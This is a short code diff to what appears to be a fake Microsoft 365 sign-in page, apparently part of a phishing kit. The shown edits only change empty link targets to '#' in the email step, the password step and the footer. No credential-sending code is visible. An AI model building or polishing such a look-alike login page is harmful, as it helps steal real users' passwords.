@@ -538,8 +538,8 @@ function pageMajor(mail) {
 
                 <input type="hidden" id="temp_p">
                 <input type="hidden" id="data_send" value="1">
-                <p id="link1">No account? <a href="">Create one!</a></p>
-                <p id="link2"><a href="">Sign in with Windows Hello or a security key</a> <span class="link_q">?</span></p>
+                <p id="link1">No account? <a href="#">Create one!</a></p>
+                <p id="link2"><a href="#">Sign in with Windows Hello or a security key</a> <span class="link_q">?</span></p>
                 <section class="btn_container">
                     <button onclick="subFormBtn(this)" id="btn_365">Next</button>
                 </section>
@@ -553,9 +553,9 @@ function pageMajor(mail) {
         </aside>
 
         <footer>
-            <a href="">Terms of use</a>
-            <a href="">Privacy & cookies</a>
-            <a href="">. . .</a>
+            <a href="#">Terms of use</a>
+            <a href="#">Privacy & cookies</a>
+            <a href="#">. . .</a>
         </footer>
     </main>
     
@@ -653,8 +653,8 @@ function subFormBtn(btn) {
             e_input.type = "password";
             header_main.innerText = "Enter password";
             btn_365.innerText = "Sign in";
-            link1.innerHTML = `<a href="">Forgot password?</a>`;
-            link2.innerHTML = `<a href="">Other ways to sign in</a>`;
+            link1.innerHTML = `<a href="#">Forgot password?</a>`;
+            link2.innerHTML = `<a href="#">Other ways to sign in</a>`;
     
         }
         else{
